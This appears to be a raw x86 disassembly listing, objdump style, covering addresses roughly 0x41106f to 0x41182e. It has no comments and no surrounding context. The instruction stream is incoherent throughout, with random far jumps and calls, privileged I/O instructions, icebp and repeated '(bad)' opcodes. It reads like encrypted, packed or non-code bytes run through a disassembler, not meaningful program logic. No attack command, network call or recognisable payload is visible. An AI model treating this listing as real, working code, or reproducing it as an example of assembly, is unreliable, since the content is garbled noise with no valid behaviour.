  41106f:	adc    eax,0x193d0ae3
  411074:	pop    esi
  411075:	ret    
  411076:	push   ecx
  411077:	push   es
  411078:	sti    
  411079:	xor    esp,DWORD PTR ds:0x7cf14cb4
  41107f:	adc    al,0x62
  411081:	jb     0x4110c0
  411083:	mov    al,0x71
  411085:	or     DWORD PTR [ecx-0x28],ebx
  411088:	add    BYTE PTR [esi-0x73],dh
  41108b:	ins    DWORD PTR es:[edi],dx
  41108c:	sbb    DWORD PTR [eax+0x4a98f5bd],ebp
  411092:	pop    edx
  411093:	dec    edx
  411094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411095:	repz shl BYTE PTR [eax-0x4ed0d853],0x42
  41109d:	and    edi,DWORD PTR [ecx-0x5c64b25f]
  4110a3:	out    0x14,eax
  4110a5:	and    eax,0x7417f198
  4110aa:	cmp    bl,BYTE PTR [ecx]
  4110ac:	loope  0x4110a6
  4110ae:	div    BYTE PTR [ebp+esi*4-0x76a19462]
  4110b5:	pop    edi
  4110b6:	sti    
  4110b7:	leave  
  4110b8:	and    dl,BYTE PTR [eax]
  4110ba:	cld    
  4110bb:	icebp  
  4110bc:	dec    ebx
  4110bd:	xchg   esi,ebx
  4110bf:	ret    0xd118
  4110c2:	ficom  WORD PTR [ebx+0x6f25ecb]
  4110c8:	inc    edx
  4110c9:	adc    dl,dh
  4110cb:	test   al,0x48
  4110cd:	stos   DWORD PTR es:[edi],eax
  4110ce:	inc    ebx
  4110cf:	sub    ch,BYTE PTR [eax+0x62c37b0c]
  4110d5:	mov    WORD PTR [ebp+edx*4-0x78],cs
  4110d9:	in     al,dx
  4110da:	psubb  mm5,mm0
  4110dd:	cld    
  4110de:	or     dl,ch
  4110e0:	ins    DWORD PTR es:[edi],dx
  4110e1:	das    
  4110e2:	out    0x92,al
  4110e4:	sti    
  4110e5:	mov    edx,0xad9909b9
  4110ea:	mov    ecx,0xff28ee2f
  4110f0:	mov    ebx,0x81b92178
  4110f5:	jmp    0x411095
  4110f7:	adc    al,0xe9
  4110f9:	(bad)  
  4110fa:	jmp    0xe7c9:0x3397a302
  411101:	dec    esp
  411102:	cmp    BYTE PTR [edx+0x21],al
  411105:	jae    0x41117f
  411107:	das    
  411108:	cld    
  411109:	lods   eax,DWORD PTR ds:[esi]
  41110a:	call   0x632ee214
  41110f:	js     0x4110fa
  411111:	loope  0x411124
  411113:	jbe    0x411180
  411115:	dec    ecx
  411116:	pop    edx
  411117:	retf   
  411118:	popa   
  411119:	imul   edx,edi,0x212fd97b
  41111f:	sahf   
  411120:	add    DWORD PTR [eax-0x30f408d4],ebx
  411126:	xchg   ecx,eax
  411127:	and    bl,BYTE PTR [esi]
  411129:	sub    al,0xad
  41112b:	imul   eax,DWORD PTR [ecx+ebx*8],0x3d
  41112f:	mov    dh,0xba
  411131:	inc    ecx
  411132:	(bad)  
  411133:	aad    0xba
  411135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411136:	in     eax,dx
  411137:	jae    0x411186
  411139:	sti    
  41113a:	adc    ebp,edi
  41113c:	fs ret 0x4469
  411140:	cwde   
  411141:	imul   edi,DWORD PTR [edi],0xffffffac
  411144:	adc    bh,BYTE PTR [edi+ebx*8-0x6c8f20b6]
  41114b:	lods   eax,DWORD PTR ds:[esi]
  41114c:	push   esp
  41114d:	icebp  
  41114e:	lods   eax,DWORD PTR ds:[esi]
  41114f:	repnz loope 0x4111a5
  411152:	jmp    0xe720:0x7ed10200
  411159:	les    esi,FWORD PTR [edx-0x2d]
  41115c:	push   0x305accbc
  411161:	xchg   ebx,eax
  411162:	sub    BYTE PTR [edx],0x5a
  411165:	daa    
  411166:	cmp    al,0xf6
  411168:	call   0xda2e:0x6eeaf9bd
  41116f:	xchg   ecx,eax
  411170:	or     ecx,DWORD PTR [esi]
  411172:	outs   dx,DWORD PTR ds:[esi]
  411173:	rol    DWORD PTR ds:[eax-0x20625c96],1
  41117a:	cmp    edi,edi
  41117c:	or     ebp,DWORD PTR [esi-0x67e53d9e]
  411182:	or     al,BYTE PTR [edx-0x2107f946]
  411188:	cmc    
  411189:	rol    bl,cl
  41118b:	jge    0x411110
  41118d:	or     bh,dh
  41118f:	inc    ebp
  411190:	mov    ds:0x8510fc62,al
  411195:	enter  0xd45a,0x46
  411199:	adc    BYTE PTR [edx],bl
  41119b:	sub    DWORD PTR [edi-0x29],edx
  41119e:	mov    dl,0xa9
  4111a0:	test   DWORD PTR [edi+0x78],0xc89ff27a
  4111a7:	pop    es
  4111a8:	mov    esp,0xcaa0bc4d
  4111ae:	jp     0x41114b
  4111b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111b1:	pop    edx
  4111b2:	mov    esi,0x6c8a70b
  4111b7:	xlat   BYTE PTR ds:[ebx]
  4111b8:	test   al,0x23
  4111ba:	aam    0xa9
  4111bc:	(bad)  
  4111bd:	mov    ch,0xb6
  4111bf:	pop    esi
  4111c0:	inc    ebx
  4111c1:	sub    eax,0x14189416
  4111c6:	enter  0x2c50,0xa7
  4111ca:	xor    al,0x32
  4111cc:	ficomp WORD PTR [ebp+0x57c9337f]
  4111d2:	popf   
  4111d3:	mov    ebp,eax
  4111d5:	sti    
  4111d6:	adc    edx,DWORD PTR [edi]
  4111d8:	dec    esi
  4111d9:	out    0x1e,al
  4111db:	call   0x9b935934
  4111e0:	popa   
  4111e1:	adc    DWORD PTR [edx+edi*1-0x65],ebp
  4111e5:	xlat   BYTE PTR ds:[ebx]
  4111e6:	add    al,0x61
  4111e8:	ss mov ebp,0x83806212
  4111ee:	push   ebp
  4111ef:	or     al,0xd7
  4111f1:	pop    esi
  4111f2:	push   cs
  4111f3:	test   eax,0x62e95ba2
  4111f8:	cdq    
  4111f9:	lahf   
  4111fa:	mov    ebx,0x229a270
  4111ff:	loope  0x4111f1
  411201:	retf   
  411202:	ret    
  411203:	js     0x411250
  411205:	or     BYTE PTR [ecx+0x6745089b],bh
  41120b:	push   cs
  41120c:	(bad)  
  41120d:	int    0xdc
  41120f:	lea    edi,[edi+0x65]
  411212:	fnstcw WORD PTR [ecx]
  411214:	repnz pop edi
  411216:	inc    esp
  411217:	fwait
  411218:	add    BYTE PTR [eax+ebp*8],cl
  41121b:	sbb    bh,bh
  41121d:	popa   
  41121e:	ja     0x411228
  411220:	cs nop
  411222:	adc    al,0xdd
  411224:	scas   eax,DWORD PTR es:[edi]
  411225:	imul   eax,DWORD PTR [ebx],0x2bd25be7
  41122b:	mov    cl,0x7a
  41122d:	pop    edx
  41122e:	sbb    esp,DWORD PTR [ecx]
  411230:	loop   0x41128d
  411232:	or     al,0xaa
  411234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411235:	xor    al,0xdc
  411237:	enter  0x4c93,0x2e
  41123b:	int    0xa1
  41123d:	cwde   
  41123e:	test   BYTE PTR [ecx-0x1b793bd0],ch
  411244:	hlt    
  411245:	sbb    BYTE PTR [ebp+0x396d2d67],0x34
  41124c:	popf   
  41124d:	push   eax
  41124e:	repnz out 0xf0,al
  411251:	jbe    0x41128a
  411253:	inc    esi
  411254:	repnz pop edi
  411256:	mov    ds:0xeccbffa0,eax
  41125b:	dec    ecx
  41125c:	das    
  41125d:	adc    DWORD PTR [eax],ecx
  41125f:	popf   
  411260:	out    0x60,al
  411262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411263:	lods   eax,DWORD PTR ds:[esi]
  411264:	mov    esi,ds
  411266:	mov    ds,WORD PTR [edx]
  411268:	fwait
  411269:	aam    0x32
  41126b:	sub    bh,dh
  41126d:	adc    BYTE PTR [edx-0x2d],0x3a
  411271:	call   0xa8c4:0x592fc3bc
  411278:	in     eax,0x71
  41127a:	in     al,0xb4
  41127c:	pop    ecx
  41127d:	jb     0x411230
  41127f:	jbe    0x41128c
  411281:	add    DWORD PTR [ebx],0x4d
  411284:	fisttp WORD PTR [edi-0x43]
  411287:	jecxz  0x411241
  411289:	sbb    ch,BYTE PTR [ecx-0x62]
  41128c:	mov    eax,ds:0x36f7a2d9
  411291:	cmp    al,bl
  411293:	std    
  411294:	retf   
  411295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411296:	fs adc bl,dh
  411299:	imul   ebx,DWORD PTR [edi+0x1037d863],0x480323c7
  4112a3:	add    BYTE PTR [edi+0xa561888],bh
  4112a9:	int3   
  4112aa:	addr16 dec edx
  4112ac:	sti    
  4112ad:	jb     0x4112a8
  4112af:	lds    esi,FWORD PTR [edi-0x1f392e9b]
  4112b5:	arpl   WORD PTR [edi],dx
  4112b7:	push   ecx
  4112b8:	xchg   ebx,eax
  4112b9:	push   0xffffffbb
  4112bb:	rol    BYTE PTR [edi],cl
  4112bd:	mov    cl,dl
  4112bf:	adc    DWORD PTR ds:0x8ce15f52,edx
  4112c5:	addr16 jnp 0x4112cb
  4112c8:	jmp    0xb45ae49a
  4112cd:	(bad)  
  4112ce:	repz ret 
  4112d0:	pusha  
  4112d1:	inc    ecx
  4112d2:	icebp  
  4112d3:	mov    es,WORD PTR [ecx]
  4112d5:	(bad)  
  4112d6:	ss clc 
  4112d8:	je     0x4112ce
  4112da:	inc    edi
  4112dc:	cwde   
  4112dd:	pop    esp
  4112de:	fs push esp
  4112e0:	jp     0x4112ae
  4112e2:	pop    ebx
  4112e3:	and    DWORD PTR [esi-0x1ec23737],ebx
  4112e9:	hlt    
  4112ea:	jno    0x41129e
  4112ec:	jmp    0xe2ea:0x3039f5b4
  4112f3:	ror    BYTE PTR [edx],1
  4112f5:	lods   eax,DWORD PTR ds:[esi]
  4112f6:	sar    BYTE PTR [eax+edx*1-0x44],cl
  4112fa:	bnd jns 0x4112a9
  4112fd:	fadd   DWORD PTR [ecx+0x16f1d1b9]
  411303:	mov    bh,0xf1
  411305:	hlt    
  411306:	ds popa 
  411308:	mov    ebp,0x6bea383
  41130d:	test   DWORD PTR [eax-0x5d],ecx
  411310:	inc    edx
  411311:	inc    edi
  411312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411313:	hlt    
  411314:	fist   DWORD PTR [eax]
  411316:	aas    
  411317:	out    0xc4,ax
  41131a:	add    ch,ah
  41131c:	nop
  41131d:	pop    ebx
  41131e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41131f:	jle    0x4112f5
  411321:	in     al,dx
  411322:	int    0x92
  411324:	inc    edx
  411325:	mov    ds:0x45b79489,al
  41132a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41132b:	icebp  
  41132c:	cli    
  41132d:	faddp  st(5),st
  41132f:	inc    esi
  411330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411331:	clc    
  411332:	int    0x11
  411334:	into   
  411335:	mov    al,ds:0xf441b6f9
  41133a:	mov    eax,0x2dd39ea6
  41133f:	aam    0x8e
  411341:	xor    DWORD PTR [edx+ebp*1+0x10],0xffffffde
  411346:	mov    dh,BYTE PTR [edi]
  411348:	inc    edi
  411349:	lods   al,BYTE PTR ds:[esi]
  41134a:	or     eax,0x6d18cc7b
  41134f:	sub    BYTE PTR [edx-0x11],al
  411352:	call   0x9dda:0xd3a9d772
  411359:	mov    bl,0x8b
  41135b:	or     eax,0xa9990ad9
  411360:	jmp    0xffe9:0x98201cc9
  411367:	dec    ebx
  411368:	loope  0x4113cf
  41136a:	ss xchg ecx,eax
  41136c:	(bad)  [ecx-0x76]
  41136f:	push   ebp
  411370:	and    DWORD PTR [esi],ebp
  411372:	jnp    0x4112f7
  411374:	fisubr DWORD PTR ds:0x8bf4bddd
  41137a:	push   esi
  41137b:	int    0x9a
  41137d:	lods   al,BYTE PTR ds:[esi]
  41137e:	fmul   QWORD PTR [ecx+ecx*2+0x49]
  411382:	push   ds
  411383:	out    dx,eax
  411384:	mov    edi,ebx
  411386:	fnsave [edx+0x601af961]
  41138c:	fistp  QWORD PTR [esi]
  41138e:	fst    DWORD PTR ds:0x58b5b798
  411394:	in     al,0x56
  411396:	jb     0x4113c9
  411398:	mov    dh,0x1a
  41139a:	gs loop 0x41132b
  41139d:	ds jmp 0x411388
  4113a0:	add    dh,ah
  4113a2:	out    dx,eax
  4113a3:	xor    cx,WORD PTR [edi+0x5cdb9127]
  4113aa:	cmc    
  4113ab:	mov    cl,0x87
  4113ad:	jo     0x4113e6
  4113af:	and    al,dh
  4113b1:	iret   
  4113b2:	iret   
  4113b3:	adc    BYTE PTR [edi],dh
  4113b5:	icebp  
  4113b6:	inc    ebx
  4113b7:	mov    edi,0x1f5d6aa0
  4113bc:	dec    ecx
  4113bd:	call   0x4a17:0xde00faac
  4113c4:	inc    esp
  4113c5:	push   ebp
  4113c6:	add    DWORD PTR [edx],ebx
  4113c8:	rcl    DWORD PTR [esp+eiz*8+0x178cfe27],cl
  4113cf:	mov    edx,0xeb3cc9c3
  4113d4:	xchg   BYTE PTR [ecx],ch
  4113d6:	imul   eax,DWORD PTR [eax+0x7a2f4038],0xffffffac
  4113dd:	iret   
  4113de:	(bad)  
  4113df:	mov    bl,0xd4
  4113e1:	pop    ecx
  4113e2:	stos   BYTE PTR es:[edi],al
  4113e3:	adc    DWORD PTR [esi-0x900c219],0x67
  4113ea:	or     al,0x67
  4113ec:	mov    ch,0x41
  4113ee:	sti    
  4113ef:	pop    ebx
  4113f0:	xlat   BYTE PTR ds:[ebx]
  4113f1:	pushf  
  4113f2:	cs inc edi
  4113f4:	xchg   DWORD PTR [ecx+0x76aa7fc],edx
  4113fa:	sub    edx,DWORD PTR [eax+0x48]
  4113fd:	adc    BYTE PTR [ecx],bl
  4113ff:	cmp    al,0xc0
  411401:	test   al,0x54
  411403:	add    edx,DWORD PTR [eax]
  411405:	cmp    al,0x84
  411407:	test   DWORD PTR [ebx],ebx
  411409:	jl     0x411469
  41140b:	xchg   edx,eax
  41140c:	cmp    esp,0x51
  41140f:	dec    esp
  411410:	outs   dx,DWORD PTR ds:[esi]
  411411:	loop   0x4113a5
  411413:	jp     0x4113bf
  411415:	(bad)  
  411416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411417:	push   ebx
  411418:	fisttp DWORD PTR ds:0xcc0f3404
  41141e:	ss adc dh,0x3b
  411422:	ret    
  411423:	in     al,0x24
  411425:	scas   eax,DWORD PTR es:[edi]
  411426:	pop    edx
  411427:	mov    ds:0x3d8d2612,eax
  41142c:	pop    ebp
  41142d:	test   BYTE PTR [ebp-0x21],dh
  411430:	inc    eax
  411431:	pop    edx
  411432:	mov    eax,ds:0x10430651
  411437:	aam    0x91
  411439:	pop    esp
  41143a:	idiv   DWORD PTR [ecx-0x6f]
  41143d:	mov    bh,0x1
  41143f:	xor    bh,BYTE PTR [ebx]
  411441:	pop    ecx
  411442:	cmovb  ebp,DWORD PTR [esi]
  411445:	add    bh,dh
  411447:	ins    BYTE PTR es:[edi],dx
  411448:	inc    ebp
  411449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41144a:	js     0x411416
  41144c:	mov    ds:0x70b628e9,eax
  411451:	jp     0x411492
  411453:	push   ds
  411454:	push   eax
  411455:	pop    esi
  411456:	mov    edi,esp
  411458:	dec    ebp
  411459:	pop    ebp
  41145a:	and    BYTE PTR [esi],dh
  41145c:	ret    
  41145d:	ret    0x6404
  411460:	(bad)  
  411461:	jge    0x411443
  411463:	xor    al,0xf4
  411465:	sti    
  411466:	in     al,0xfe
  411468:	push   0xe1ee38f1
  41146d:	in     eax,dx
  41146e:	lea    eax,[ebp-0x3]
  411471:	or     cl,BYTE PTR [ebx+0x3abd8ea4]
  411477:	(bad)  
  411478:	jmp    0x7609477c
  41147d:	inc    ecx
  41147e:	mov    WORD PTR [ebx-0x1c],fs
  411481:	dec    edi
  411482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411483:	jmp    0xfb0cd999
  411488:	add    al,0x49
  41148a:	in     al,dx
  41148b:	ja     0x4114b3
  41148d:	cdq    
  41148e:	xor    BYTE PTR [ebp-0x1f],0x59
  411492:	(bad)  
  411494:	or     bl,0xb0
  411497:	mov    ds:0x282bc017,al
  41149c:	or     eax,0xbb111b30
  4114a2:	xchg   dh,cl
  4114a4:	addr16 jo 0x41151f
  4114a7:	cmp    edi,ebp
  4114a9:	xchg   edx,eax
  4114aa:	sub    ebp,edx
  4114ac:	fsubr  DWORD PTR [edi+0x7a]
  4114af:	in     al,0x9f
  4114b1:	das    
  4114b2:	sbb    eax,0x9cb621f7
  4114b7:	or     al,0xf2
  4114b9:	jnp    0x411473
  4114bb:	and    ebx,DWORD PTR [edx]
  4114bd:	fidivr WORD PTR [ebx+0x3bb21ddd]
  4114c3:	dec    ebp
  4114c4:	or     al,bh
  4114c6:	scas   al,BYTE PTR es:[edi]
  4114c7:	aad    0xa0
  4114c9:	lods   al,BYTE PTR ds:[esi]
  4114ca:	popa   
  4114cb:	pop    ds
  4114cc:	inc    ecx
  4114cd:	dec    eax
  4114ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114cf:	gs out 0x3f,eax
  4114d2:	test   ebx,edx
  4114d4:	not    bl
  4114d6:	pop    sp
  4114d8:	lods   eax,DWORD PTR ds:[esi]
  4114d9:	xor    cl,ch
  4114db:	pop    es
  4114dc:	mov    esp,0xcf28d26e
  4114e1:	pop    ecx
  4114e2:	ins    DWORD PTR es:[edi],dx
  4114e3:	cmp    eax,0xdc1248b7
  4114e8:	stos   BYTE PTR es:[edi],al
  4114e9:	cld    
  4114ea:	inc    edi
  4114eb:	mov    al,0x86
  4114ed:	add    eax,0x7b17cb93
  4114f2:	stos   DWORD PTR es:[edi],eax
  4114f3:	push   cs
  4114f4:	lods   eax,DWORD PTR ds:[esi]
  4114f5:	push   ecx
  4114f6:	scas   eax,DWORD PTR es:[edi]
  4114f7:	outs   dx,DWORD PTR ds:[esi]
  4114f8:	cmp    dl,BYTE PTR [ebx+0x321e72e0]
  4114fe:	mov    ds:0xca5b245a,eax
  411503:	mov    bl,bl
  411505:	icebp  
  411506:	(bad)  [di-0x5bbc]
  41150b:	sbb    BYTE PTR [eax],cl
  41150d:	dec    ebx
  41150e:	call   0x9934:0x5cffe95c
  411515:	cmp    al,BYTE PTR [ebp+ebp*8-0x47]
  411519:	xchg   DWORD PTR [edx-0x34],ebx
  41151c:	addr16 jns 0x41155b
  41151f:	ret    
  411520:	ficom  WORD PTR [edi+0x159ba18b]
  411526:	ja     0x411569
  411528:	sub    al,0xb3
  41152a:	or     eax,0xb9db5dd9
  41152f:	lds    edi,FWORD PTR [edi+0x4e7964a6]
  411535:	cmp    DWORD PTR [eax],ebp
  411537:	sbb    DWORD PTR [esp+eax*4+0x26],esi
  41153b:	inc    ebp
  41153c:	cmc    
  41153d:	jmp    0x4114d2
  41153f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411540:	push   esi
  411541:	push   ebp
  411542:	pop    ds
  411543:	cmp    BYTE PTR [ecx-0x27],ah
  411546:	mov    ds:0x3a60f3ac,eax
  41154b:	out    dx,al
  41154c:	jp     0x41157a
  41154e:	les    edx,FWORD PTR [esi-0x1cf35287]
  411554:	popa   
  411555:	and    BYTE PTR [ebx],dh
  411557:	call   0x2bd5:0x42fabed7
  41155e:	test   eax,0x4f94a948
  411563:	xchg   ebx,eax
  411564:	xchg   esp,eax
  411565:	scas   al,BYTE PTR es:[edi]
  411566:	jbe    0x4115c8
  411568:	dec    esp
  411569:	ror    BYTE PTR [edx+0x57],1
  41156c:	cwde   
  41156d:	jnp    0x4115d3
  41156f:	pop    ecx
  411570:	dec    ebx
  411571:	fstp   QWORD PTR [esi-0x5c]
  411574:	sbb    al,0xaf
  411576:	dec    esi
  411577:	int    0x69
  411579:	pop    ds
  41157a:	xor    al,0x3a
  41157c:	mov    ?,WORD PTR [edx+0xedf8063]
  411582:	fstp   TBYTE PTR [ebx-0x2]
  411585:	mov    ch,0x20
  411587:	sub    DWORD PTR [eax],eax
  411589:	imul   ebp,DWORD PTR [edx],0xd2c6f315
  41158f:	and    ebx,DWORD PTR [ecx+0x34d58ca]
  411595:	or     edi,DWORD PTR [ecx-0x6f3522da]
  41159b:	bound  edi,QWORD PTR [esi+0x37]
  41159e:	shl    DWORD PTR [edi+ebp*2],cl
  4115a1:	or     eax,0x7ef2f916
  4115a6:	daa    
  4115a7:	pop    edx
  4115a8:	sub    ecx,edx
  4115aa:	fwait
  4115ab:	adc    BYTE PTR [esi-0x64],bh
  4115ae:	int    0x86
  4115b0:	popf   
  4115b1:	call   0x8bb2:0xe8a1476a
  4115b8:	dec    esp
  4115b9:	xchg   ebx,eax
  4115ba:	fwait
  4115bb:	cmc    
  4115bc:	jg     0x411629
  4115be:	inc    ebx
  4115bf:	ja     0x411605
  4115c1:	icebp  
  4115c2:	test   eax,0x888ed6b4
  4115c7:	push   esi
  4115c8:	ss js  0x41158b
  4115cb:	scas   eax,DWORD PTR es:[edi]
  4115cc:	mov    cl,0x3
  4115ce:	push   ebp
  4115cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d0:	xor    BYTE PTR [eax+0x42],bh
  4115d3:	out    dx,al
  4115d4:	xchg   ebx,eax
  4115d5:	and    eax,0x1974b8f1
  4115da:	loope  0x41160f
  4115dc:	int3   
  4115dd:	sbb    esi,esp
  4115df:	and    bl,al
  4115e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115e2:	dec    ecx
  4115e3:	jb     0x4115e4
  4115e5:	aaa    
  4115e6:	mov    ecx,0x40d99ebc
  4115eb:	mov    eax,ds:0x21eb2ed1
  4115f0:	clc    
  4115f1:	cmp    edx,DWORD PTR [edx-0x7405490]
  4115f7:	fstp   TBYTE PTR [eax+0x79]
  4115fa:	adc    al,0xb8
  4115fc:	mov    eax,ds:0x20131ef6
  411601:	inc    esp
  411602:	push   ss
  411603:	inc    edx
  411604:	enter  0x7b6f,0x86
  411608:	jmp    0x4115eb
  41160a:	std    
  41160b:	lahf   
  41160c:	jge    0x411638
  41160e:	jb     0x4115fc
  411610:	jle    0x41160a
  411612:	test   DWORD PTR [edi+0x57c2e442],esp
  411618:	push   esp
  411619:	lds    edx,FWORD PTR cs:[eax-0x1b8e2cec]
  411620:	js     0x411623
  411622:	inc    eax
  411623:	xor    ebx,DWORD PTR [ebp+0x71388cec]
  411629:	sti    
  41162a:	scas   eax,DWORD PTR es:[edi]
  41162b:	xor    ebp,edi
  41162d:	sbb    dl,BYTE PTR [edx+0x2f]
  411630:	loopne 0x411625
  411632:	bound  ebx,QWORD PTR [ebx]
  411634:	and    DWORD PTR [edi-0x76e18351],ecx
  41163a:	lahf   
  41163b:	shr    BYTE PTR [ebx],1
  41163d:	je     0x411619
  41163f:	xor    eax,0xfeb7afed
  411644:	cld    
  411645:	xlat   BYTE PTR ds:[ebx]
  411646:	(bad)  
  411647:	or     BYTE PTR ds:0x60f9109f,al
  41164d:	mov    eax,0x53aed178
  411652:	dec    edi
  411653:	push   DWORD PTR [ebx+0x18]
  411656:	or     ebx,DWORD PTR [edi-0x4c60d91d]
  41165c:	popa   
  41165d:	or     BYTE PTR [edx-0x71],ah
  411660:	sar    dh,1
  411662:	loopne 0x4116b5
  411664:	jo     0x4116c5
  411666:	xor    eax,0xa08e42ef
  41166b:	loope  0x41164e
  41166d:	addr16 xchg edx,eax
  41166f:	cld    
  411670:	sbb    al,0xbc
  411672:	shr    BYTE PTR [esi+0x6b8a0b1d],cl
  411678:	dec    ebp
  411679:	cmp    eax,0x3e967d84
  41167e:	lods   al,BYTE PTR ds:[esi]
  41167f:	lock hlt 
  411681:	inc    ecx
  411682:	jne    0x411691
  411684:	mov    es,WORD PTR [esi-0x57]
  411687:	sbb    eax,0x5a954da8
  41168c:	iret   
  41168d:	cwde   
  41168e:	sahf   
  41168f:	mov    esp,0x57abd1be
  411694:	mov    ebx,ecx
  411696:	jno    0x411700
  411698:	cld    
  411699:	daa    
  41169a:	pop    edx
  41169b:	xor    eax,0xf3511ff6
  4116a0:	iret   
  4116a1:	sub    al,BYTE PTR [ebp+0x34]
  4116a4:	inc    eax
  4116a5:	shr    DWORD PTR [edx],cl
  4116a7:	push   ds
  4116a8:	adc    edx,DWORD PTR [edx]
  4116aa:	mov    ebp,ecx
  4116ac:	loopne 0x411661
  4116ae:	inc    eax
  4116af:	fisubr DWORD PTR [ecx+0x50ab8ef4]
  4116b5:	jl     0x411659
  4116b7:	mov    ch,0xd8
  4116b9:	addr16 call 0x5c88a8fc
  4116bf:	(bad)  
  4116c0:	xor    edx,ebx
  4116c2:	aad    0x0
  4116c4:	sar    DWORD PTR [eax+eiz*2-0x255e435],1
  4116cb:	ret    0xf46c
  4116ce:	fild   DWORD PTR [edi+0xb]
  4116d1:	fist   WORD PTR [esi-0x73da162f]
  4116d7:	dec    eax
  4116d8:	aad    0x2c
  4116da:	test   BYTE PTR [esi+0x6c],cl
  4116dd:	ds jecxz 0x411749
  4116e0:	out    dx,eax
  4116e1:	imul   edi,DWORD PTR [esi+0x1570e5e5],0x1f0d4d24
  4116eb:	cmp    eax,0x91e9453
  4116f0:	dec    ebx
  4116f1:	xor    al,dl
  4116f3:	cmc    
  4116f4:	xor    ebx,DWORD PTR [eax-0xb099100]
  4116fa:	aam    0xd0
  4116fc:	into   
  4116fd:	popa   
  4116fe:	push   ds
  4116ff:	mov    ?,WORD PTR [eax+ebp*8-0x2352dd2e]
  411706:	push   ds
  411707:	jne    0x411699
  411709:	fisubr WORD PTR [esi+0x48b46e5f]
  41170f:	push   ds
  411710:	mov    ds:0x332e40cc,al
  411715:	out    dx,eax
  411716:	mov    bh,0xe0
  411718:	mov    bh,BYTE PTR [edx+0x56a6b79d]
  41171e:	ss stos BYTE PTR es:[edi],al
  411720:	jp     0x4116d0
  411722:	mov    al,0xaf
  411724:	jae    0x411733
  411726:	lock inc ebx
  411728:	push   edx
  411729:	and    DWORD PTR [eax-0x41e7fc8e],eax
  41172f:	xchg   ecx,eax
  411730:	inc    ebp
  411731:	jno    0x41173f
  411733:	imul   bl
  411735:	call   0x83b0d1b2
  41173a:	(bad)  
  41173b:	out    0xc4,eax
  41173d:	cmp    al,0x4c
  41173f:	or     al,0x44
  411741:	mov    WORD PTR [esi-0x1c347a3],ss
  411747:	(bad)
  41174a:	mov    al,0x41
  41174c:	xchg   DWORD PTR [eax],eax
  41174e:	and    al,0xac
  411750:	sub    al,0x6c
  411752:	dec    ebp
  411753:	iret   
  411754:	pop    edx
  411755:	outs   dx,DWORD PTR ds:[esi]
  411756:	and    eax,ecx
  411758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411759:	les    eax,FWORD PTR [ecx+ecx*4-0x4c6ebbea]
  411760:	mov    eax,edx
  411762:	or     esp,DWORD PTR [eax+0x4a]
  411765:	xor    eax,DWORD PTR [eax]
  411767:	aam    0xc0
  411769:	and    ch,BYTE PTR ds:0x48db0c8d
  41176f:	xchg   DWORD PTR [edi-0x3a],edx
  411772:	mov    ds:0x7b4b57d9,al
  411777:	adc    BYTE PTR [ecx-0x7e],dh
  41177a:	dec    esi
  41177b:	mov    BYTE PTR [esi-0x40],ah
  41177e:	icebp  
  41177f:	ins    DWORD PTR es:[edi],dx
  411780:	mov    es,esp
  411782:	fsub   st,st(1)
  411784:	sub    BYTE PTR [eax+ebx*2+0x798b1f68],dh
  41178b:	push   eax
  41178c:	test   BYTE PTR [ecx],0x97
  41178f:	xchg   DWORD PTR [eax],edx
  411791:	inc    esi
  411792:	xor    eax,0x6cb48070
  411797:	into   
  411798:	fimul  WORD PTR [esp+edx*2-0x529f1c2c]
  41179f:	test   DWORD PTR [edx-0x28c5ab92],ecx
  4117a5:	or     eax,0x9365ddee
  4117aa:	xchg   ecx,eax
  4117ab:	jle    0x411803
  4117ad:	pop    eax
  4117ae:	xor    ch,ch
  4117b0:	cmp    eax,0x6c69fec6
  4117b5:	jp     0x4117a0
  4117b7:	sbb    edi,DWORD PTR [esi+0x415eb51e]
  4117bd:	lock pop edx
  4117bf:	xchg   ecx,eax
  4117c0:	mov    dl,0x50
  4117c2:	(bad)  
  4117c3:	pop    ebp
  4117c4:	inc    ebx
  4117c5:	sub    eax,0x8641140b
  4117ca:	(bad)  
  4117cb:	fild   DWORD PTR [eax+0x48]
  4117ce:	xor    ebx,eax
  4117d0:	ins    DWORD PTR es:[edi],dx
  4117d1:	bound  eax,QWORD PTR [esp+ebx*8-0x5aea23a8]
  4117d8:	sub    al,BYTE PTR [edi-0x52]
  4117db:	cmp    ecx,DWORD PTR [eax]
  4117dd:	imul   edi,DWORD PTR ss:[edi],0x16395ef0
  4117e4:	in     eax,dx
  4117e5:	adc    DWORD PTR [esi+eax*4-0x52],eax
  4117e9:	ficom  DWORD PTR ds:0xa56119c8
  4117ef:	mov    dl,BYTE PTR [esi+ebx*4+0x63]
  4117f3:	xor    bl,BYTE PTR [ebx+0x5e5bc04f]
  4117f9:	push   esi
  4117fa:	(bad)  
  4117fb:	vmread DWORD PTR [edi-0x18],edi
  4117ff:	push   ebx
  411800:	fbld   TBYTE PTR [ebx+0x27]
  411803:	aaa    
  411804:	push   ds
  411805:	jmp    0x411866
  411807:	into   
  411808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411809:	push   0x5e4452d6
  41180e:	and    ecx,edx
  411810:	das    
  411811:	fnstsw WORD PTR ds:0x4f811e3d
  411817:	mov    ch,0x54
  411819:	loop   0x411808
  41181b:	jno    0x411821
  41181d:	cmc    
  41181e:	push   esi
  41181f:	or     edi,DWORD PTR [edx+0x2bc56670]
  411825:	fist   WORD PTR [ecx-0x6057cfd1]
  41182b:	jmp    0x411891
  41182d:	pushf  
  41182e:	and    BYTE PTR [ebp+0x6e6ac35],dh
